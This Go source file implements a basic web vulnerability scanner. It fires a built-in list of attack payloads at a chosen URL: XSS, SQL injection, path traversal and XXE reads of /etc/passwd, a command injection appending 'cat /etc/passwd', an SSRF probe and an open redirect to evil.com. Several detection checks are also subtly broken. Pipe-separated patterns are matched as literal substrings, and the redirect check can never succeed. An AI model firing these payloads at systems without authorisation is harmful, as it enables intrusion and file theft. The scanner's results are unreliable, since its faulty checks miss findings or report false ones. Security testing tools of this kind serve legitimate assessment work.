package vuln

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type VulnCheck struct {
	Name    string
	Param   string
	Payload string
	Match   string
	Method  string
}

var vulns = []VulnCheck{
	// XSS
	{"XSS (Reflected)", "q", "<script>alert(1)</script>", "<script>alert(1)</script>", "GET"},

	// SQL Injection
	{"SQL Injection (Error-Based)", "id", "' OR '1'='1", "sql syntax|mysql_fetch|ORA-|ODBC|SQLite", "GET"},

	// Local File Inclusion
	{"LFI", "file", "../../../../etc/passwd", "root:x:0:0", "GET"},

	// Open Redirect
	{"Open Redirect", "next", "//evil.com", "Location: http://evil.com", "GET"},

	// Command Injection
	{"Command Injection", "ip", "127.0.0.1; cat /etc/passwd", "root:x:0:0", "GET"},

	// Server-Side Request Forgery (SSRF)
	{"SSRF", "url", "http://127.0.0.1:80", "Server|Apache|nginx|Bad Request", "GET"},

	// Cross-Site Request Forgery (CSRF) — Detection is passive
	{"CSRF", "", "", "Set-Cookie", "GET"},

	// Remote Code Execution
	{"RCE (Basic)", "cmd", "echo knife", "knife", "GET"},

	// Directory Traversal
	{"Directory Traversal", "path", "../../../../etc/passwd", "root:x:0:0", "GET"},

	// XML External Entity (XXE)
	{"XXE", "xml", "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", "root:x:0:0", "POST"},
}

func ScanURL(target string) {
	client := &http.Client{Timeout: 10 * time.Second}
	fmt.Println("[+] Starting scan:", target)

	for _, check := range vulns {
		u, err := url.Parse(target)
		if err != nil {
			continue
		}

		q := u.Query()
		if check.Param != "" {
			q.Set(check.Param, check.Payload)
		}
		u.RawQuery = q.Encode()
		testURL := u.String()

		var req *http.Request
		if check.Method == "POST" {
			data := url.Values{}
			data.Set(check.Param, check.Payload)
			req, _ = http.NewRequest("POST", target, strings.NewReader(data.Encode()))
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		} else {
			req, _ = http.NewRequest("GET", testURL, nil)
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if strings.Contains(strings.ToLower(string(body)), strings.ToLower(check.Match)) ||
			strings.Contains(strings.ToLower(resp.Header.Get("Location")), strings.ToLower(check.Match)) {
			fmt.Printf("[!] Potential %s detected with param '%s' using %s method → %s\n", check.Name, check.Param, check.Method, testURL)
		}
	}
	fmt.Println("[+] Full scan complete.")
}
